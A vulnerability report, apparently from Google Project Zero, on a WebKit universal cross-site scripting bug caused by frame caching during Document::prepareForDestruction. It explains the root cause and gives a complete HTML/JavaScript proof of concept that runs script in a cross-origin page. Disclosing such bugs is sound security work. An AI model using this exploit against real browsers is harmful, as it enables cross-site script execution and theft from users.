# UXSS via Document::prepareForDestruction and CachedFrame
### Reported by lokihardt@google.com, Mar 3 2017

Here's a snippet of Document::prepareForDestruction

```cpp
void Document::prepareForDestruction()
{
    if (m_hasPreparedForDestruction)
        return;
    ...
    detachFromFrame();

    m_hasPreparedForDestruction = true;
}
```
`Document::prepareForDestruction` is called on the assumption that the document will not be used again with its frame. However, if a frame caching is made in `Document::prepareForDestruction`, the document's frame will be stored in a CachedFrame object that will reattach the frame at some point, and thereafter, the document's frame will be never detached due to `m_hasPreparedForDestruction`.


PoC:

```html

<body>
Click anywhere.
<script>
function createURL(data, type = 'text/html') {
    return URL.createObjectURL(new Blob([data], {type: type}));
}

function waitFor(check, cb) {
    let it = setInterval(() => {
        if (check()) {
            clearInterval(it);
            cb();
        }
    }, 10);
}

window.onclick = () => {
    window.onclick = null;

    w = open(createURL(''), '', 'width=500, height=500');
    w.onload = () => {
        setTimeout(() => {
            let f = w.document.body.appendChild(document.createElement('iframe'));
            f.contentWindow.onunload = () => {
                f.contentWindow.onunload = null;

                w.__defineGetter__('navigator', () => new Object());

                let a = w.document.createElement('a');
                a.href = 'about:blank';
                a.click();

                setTimeout(() => {
                    w.history.back();
                    setTimeout(() => {
                        let d = w.document;
                        w.location = 'javascript:' + encodeURI(`"<script>location = 'https://abc.xyz/';</scrip` + `t>"`);

                        let it = setInterval(() => {
                            try {
                                w.xxxx;
                            } catch (e) {
                                clearInterval(it);

                                let a = d.createElement('a');
                                a.href = 'javascript:alert(location);';
                                a.click();
                            }
                        }, 10);
                    }, 100);
                }, 100);
            };

            w.location = 'javascript:""';
        }, 0);
    };

}

</script>
</body>
```

https://bugs.chromium.org/p/project-zero/issues/detail?id=1163